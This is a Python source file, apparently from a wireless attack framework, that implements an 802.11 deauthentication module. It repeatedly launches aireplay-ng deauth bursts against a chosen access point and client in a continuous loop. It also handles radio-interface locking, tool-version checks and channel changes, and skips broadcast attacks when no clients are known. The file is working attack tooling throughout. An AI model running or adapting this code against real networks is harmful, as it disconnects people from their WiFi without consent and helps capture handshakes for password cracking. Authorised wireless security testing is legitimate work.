import asyncio
import os
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class DeauthModule(Module):
    """
    Active 802.11 Deauthentication Module.
    Acquires an exclusive monitor.locked lease and runs aireplay-ng.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.deauth"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface")
        bssid = params.get("bssid")
        client_mac = params.get("client_mac", "FF:FF:FF:FF:FF:FF")
        
        if not iface:
            raise ValueError("Interface is required for deauth")
        if not bssid:
            raise ValueError("Target BSSID is required for deauth")
        
        # Validate that the target has clients before starting broadcast deauth
        if client_mac == "FF:FF:FF:FF:FF:FF":
            from wcarck.db.session import SessionLocal
            from wcarck.db.models import Client
            from sqlalchemy import select
            
            async with SessionLocal() as session:
                result = await session.execute(select(Client).where(Client.associated_bssid == bssid))
                clients = result.scalars().all()
                if not clients:
                    bus.publish("module.error", {
                        "job_id": job_id, "module": self.name,
                        "level": "WARN",
                        "message": f"Refusing to broadcast deauth {bssid} - no known clients."
                    })
                    return
        
        # Acquire Exclusive Lease (monitor.locked prevents scans or channel hops)
        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "monitor.locked")
        
        self._running = True
        self._burst_task = asyncio.create_task(self._burst_loop(job_id, bssid, client_mac, iface))
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def _burst_loop(self, job_id, bssid, client_mac, iface):
        """Single-burst-then-sleep pattern."""
        clients = [None] if client_mac == "FF:FF:FF:FF:FF:FF" else [None, client_mac]
        
        # Check aireplay-ng version for -D flag compatibility
        use_d_flag = True
        try:
            import subprocess
            out = subprocess.check_output(["aireplay-ng", "--help"], text=True, stderr=subprocess.STDOUT)
            if "-D" not in out and "disable AP resolution" not in out.lower():
                use_d_flag = False
        except Exception:
            pass

        while self._running:
            for client in clients:
                if not self._running: 
                    break
                
                cmd = ["aireplay-ng", "-0", "64", "--ignore-negative-one"]
                if use_d_flag:
                    cmd.append("-D")
                cmd.extend(["-a", bssid])
                if client:
                    cmd.extend(["-c", client])
                cmd.append(iface)
                
                if os.name == 'nt':
                    cmd = ["python", "-c", f"import time; print('Deauth burst {bssid} -> {client}...'); time.sleep(1)"]
                    
                self._process = ManagedProcess(cmd=cmd, job_id=job_id)
                await self._process.start()
                
                try:
                    if self._process._process:
                        await asyncio.wait_for(self._process._process.wait(), timeout=3.0)
                        rc = self._process._process.returncode
                        if rc == 7:
                            bus.publish("deauth.channel_race", {
                                "job_id": job_id, "bssid": bssid, "client": client,
                                "hint": "AP changed channel; consider re-scanning"
                            })
                except asyncio.TimeoutError:
                    await self._process.stop()
                except Exception as e:
                    logger.error(f"Burst error: {e}")
                    
                await asyncio.sleep(1.0)  # brief sleep between bursts

    async def stop(self, job_id: str) -> None:
        self._running = False
        try:
            if hasattr(self, '_burst_task') and self._burst_task:
                self._burst_task.cancel()
            if self._process:
                await self._process.stop()
                self._process = None
        finally:
            if getattr(self, 'iface', None):
                await self.lease_manager.release(job_id, self.iface)
                
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._process is not None,
            "module": self.name
        }
